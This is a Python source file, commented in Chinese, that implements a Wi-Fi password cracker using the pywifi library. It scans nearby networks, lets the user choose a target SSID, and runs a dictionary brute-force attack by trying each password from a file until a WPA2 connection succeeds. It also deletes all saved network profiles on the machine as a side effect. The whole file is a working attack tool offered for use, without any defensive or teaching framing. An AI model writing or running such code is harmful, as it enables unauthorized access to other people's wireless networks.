# 作者  奥德彪
# 时间  20250305

import pywifi
from pywifi import const
import time

class WiFiCracker:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]  # 获取第一个无线网卡接口

    def scan_wifi(self):
        """扫描附近的 WiFi 网络"""
        self.iface.scan()
        time.sleep(2)  # 等待扫描完成
        scan_results = self.iface.scan_results()
        return scan_results

    def connect_to_wifi(self, ssid, password):
        """尝试连接到指定 WiFi"""
        self.iface.disconnect()  # 断开当前连接
        time.sleep(1)
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        self.iface.remove_all_network_profiles()  # 移除所有网络配置文件   ps : 注意备份wifi密码哦~
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)
        time.sleep(5)  # 等待连接完成

        if self.iface.status() == const.IFACE_CONNECTED:
            print(f"成功连接到 {ssid} 使用密码: {password}")
            return True
        else:
            print(f"无法连接到 {ssid} 使用密码: {password}")
            return False

    def brute_force_wifi(self, ssid, password_list):
        """使用密码列表尝试暴力破解 WiFi"""
        for password in password_list:
            password = password.strip()  # 去除密码前后的空白字符
            print(f"尝试密码: {password}")
            if self.connect_to_wifi(ssid, password):
                break

    def load_password_list(self, file_path):
        """从文件中加载密码列表"""
        try:
            with open(file_path, "r", encoding="utf-8") as file:
                password_list = file.readlines()
            return password_list
        except FileNotFoundError:
            print(f"文件 {file_path} 未找到！")
            return []
        except Exception as e:
            print(f"读取文件时出错: {e}")
            return []

    def select_wifi(self, scan_results):
        """显示扫描结果并选择目标 WiFi"""
        print("扫描到的 WiFi 网络：")
        for i, network in enumerate(scan_results):
            ssid = network.ssid
            signal_strength = network.signal
            print(f"{i + 1}. SSID: {ssid}, 信号强度: {signal_strength} dBm")

        while True:
            try:
                choice = int(input("请选择要连接的 WiFi 编号（输入 0 退出）："))
                if choice == 0:
                    return None
                if 1 <= choice <= len(scan_results):
                    return scan_results[choice - 1].ssid
                else:
                    print("输入无效，请重新选择！")
            except ValueError:
                print("输入无效，请输入数字！")

    def run(self, password_file="password_list.txt"):
        """运行 WiFi 破解程序"""
        # 从文件中加载密码字典
        password_list = self.load_password_list(password_file)
        if not password_list:
            print("密码字典为空，请检查文件内容！")
            return

        # 扫描附近的 WiFi
        scan_results = self.scan_wifi()
        if not scan_results:
            print("未扫描到任何 WiFi 网络！")
            return

        # 选择要连接的 WiFi
        target_ssid = self.select_wifi(scan_results)
        if not target_ssid:
            print("已退出程序。")
            return

        # 对选择的 WiFi 进行密码破解
        print(f"正在尝试连接到 WiFi: {target_ssid}")
        self.brute_force_wifi(target_ssid, password_list)

if __name__ == "__main__":
    # 创建 WiFiCracker 实例并运行
    cracker = WiFiCracker()
    cracker.run("passwords.txt")